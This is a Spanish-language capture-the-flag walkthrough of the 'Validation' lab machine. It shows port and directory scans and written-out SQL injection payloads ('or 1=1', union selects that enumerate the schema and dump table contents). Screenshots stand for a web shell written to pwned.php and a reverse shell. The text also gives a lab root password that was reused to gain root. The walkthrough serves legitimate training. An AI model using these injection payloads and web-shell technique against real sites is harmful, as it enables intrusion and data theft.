-- --
- Tags: #ejptmachine #sqlinyection #wsi #webshellinyection 
--- - 
### ¿Qué habilidades puedes practicar con Validation?

1. **Reconocimiento web y explotación:**
    - **Validation** se centra en una vulnerabilidad web clásica: **SQL Injection** (SQLi).
    - La máquina involucra un desafío de **inyección SQL basada en tiempo**, lo cual te permitirá practicar cómo identificar y explotar vulnerabilidades en aplicaciones web, algo que es clave para la **eJPTv2**.
    - Aprenderás a usar herramientas como **sqlmap** o hacer inyecciones manualmente.
2. **Enumeración y descubrimiento de servicios:**
    - Al igual que otras máquinas, necesitarás hacer un **escaneo de puertos** con **Nmap** para identificar los servicios expuestos.
    - Esta máquina también requiere usar herramientas de descubrimiento de directorios y vulnerabilidades web, como **Gobuster** o **Dirbuster**, para buscar puntos de entrada adicionales.
3. **Escalada de privilegios:**
    - Después de obtener acceso inicial, necesitarás practicar la **escalada de privilegios** en el sistema, lo que involucra investigar configuraciones incorrectas o archivos sensibles para obtener acceso completo al sistema.
    - Esto se puede hacer explorando el sistema operativo (Linux en este caso) y utilizando herramientas como **LinPEAS** para enumerar posibles vectores de escalada.
---

`nmap -p- -sV -sC --open -sS -vvv -n -Pn 10.10.11.116 -oN escaneo`

![Pasted image 20241117195111](../../Fotos/Pasted%20image%2020241117195111.png)

whatweb

![Pasted image 20241117195124](../../Fotos/Pasted%20image%2020241117195124.png)

`wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.116/FUZZ`

![Pasted image 20241117195133](../../Fotos/Pasted%20image%2020241117195133.png)

![Pasted image 20241117195142](../../Fotos/Pasted%20image%2020241117195142.png)

![Pasted image 20241117195148](../../Fotos/Pasted%20image%2020241117195148.png)

Teste ver si es vulnerable a cross site, si da la operacion es por que es vulnerable, en este caso no lo es

![Pasted image 20241117195204](../../Fotos/Pasted%20image%2020241117195204.png)

Se revisa la web

![Pasted image 20241117195212](../../Fotos/Pasted%20image%2020241117195212.png)

Vemos que en el registro hay un archivo account.php

![Pasted image 20241117195236](../../Fotos/Pasted%20image%2020241117195236.png)

![Pasted image 20241117195247](../../Fotos/Pasted%20image%2020241117195247.png)

Burpsuite

![Pasted image 20241117195254](../../Fotos/Pasted%20image%2020241117195254.png)

![Pasted image 20241117195301](../../Fotos/Pasted%20image%2020241117195301.png)

`' or 1=1-- -`
- Es para ver si hay vulnerabilidad de SQLI, en este caso vemos que si por que nos enumera en forma de lista lo que hemos ingresado anteriormente a la base de datos.

![Pasted image 20241117195307](../../Fotos/Pasted%20image%2020241117195307.png)

`' union select database()-- -`
- Enumera el nombre de la base de datos en uso

![Pasted image 20241117195315](../../Fotos/Pasted%20image%2020241117195315.png)

`' union select schema_name from information_schema.schemata-- -`
- Enumera todas las base de datos incluyendo las que no están en uso

![Pasted image 20241117195321](../../Fotos/Pasted%20image%2020241117195321.png)

`' union select table_name from information_shema.tables where table_schema="registration"-- -`
- Enumera las tablas dentro de la base de datos registration

![Pasted image 20241117195328](../../Fotos/Pasted%20image%2020241117195328.png)

`' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -`
- Enumera las columnas dentro de la tabla registration y de la base de datos registration

![Pasted image 20241117195345](../../Fotos/Pasted%20image%2020241117195345.png)

`' union select group_concat(username,userhash,country,regtime) from registration-- -`
- Enumera el contenido de las columnas dentro de la tabla registration y de la base de datos registration

![Pasted image 20241117195354](../../Fotos/Pasted%20image%2020241117195354.png)

- En este caso no vemos nada interesante, vemos que la data que hemos metido en el registro de la web quedaron aqui y claramente la base de datos estaba vacia.

![Pasted image 20241117213050](../../Fotos/Pasted%20image%2020241117213050.png)

- Nos permite obtener una consola por la url si se ejecuta el archivo, estamos creando un archivo llamado pwned.php en la ruta indicada con el contenido mencionado.
- Apache por defecto guarda el documento html por defecto en esta ruta

![Pasted image 20241117202456](../../Fotos/Pasted%20image%2020241117202456.png)

- Nos da un error lo cual en este caso es bueno, lo que haremos será probar la nueva ruta.

![Pasted image 20241117213147](../../Fotos/Pasted%20image%2020241117213147.png)

*Web Shell Injection*

![Pasted image 20241117213207](../../Fotos/Pasted%20image%2020241117213207.png)

*Reverse Shell*

![Pasted image 20241117213544](../../Fotos/Pasted%20image%2020241117213544.png)

Ahora no es tan solo colocar la sintaxis para la reverse shell en la barra de la url si no que hay que ir al DECODER en Burpsuite y codificarlo como URL para poder colocarlo en la barra de búsqueda y que se ejecute correctamente lo que buscamos.

- Encode

![Pasted image 20241117213742](../../Fotos/Pasted%20image%2020241117213742.png)

![Pasted image 20241117220251](../../Fotos/Pasted%20image%2020241117220251.png)

![Pasted image 20241117220312](../../Fotos/Pasted%20image%2020241117220312.png)

-  la data URLncodeada la copiamos y la pegamos para ejecutarla en la barra de búsqueda.

![Pasted image 20241117214118](../../Fotos/Pasted%20image%2020241117214118.png)

Ejecutamos y se nos quedara cargando

![Pasted image 20241117220334](../../Fotos/Pasted%20image%2020241117220334.png)

`Maquina vulnerada`

Generamos la conexión exitosamente

![Pasted image 20241117220347](../../Fotos/Pasted%20image%2020241117220347.png)

*Tratamiento CLI*
script /dev/null -c bash
ctrl+z

![Pasted image 20241117220649](../../Fotos/Pasted%20image%2020241117220649.png)

![Pasted image 20241117220713](../../Fotos/Pasted%20image%2020241117220713.png)

- Listo

Obtenemos informacion, en este caos una clave

![Pasted image 20241117220819](../../Fotos/Pasted%20image%2020241117220819.png)

uhc-9qual-global-pw

![Pasted image 20241117220931](../../Fotos/Pasted%20image%2020241117220931.png)

- Con su intentamos validar si podemos utilizar la clave obtenida para entrar como root y lo logramos.

De esta forma podremos obtener la Flag de root

![Pasted image 20241117221013](../../Fotos/Pasted%20image%2020241117221013.png)

Maquina finalizada.




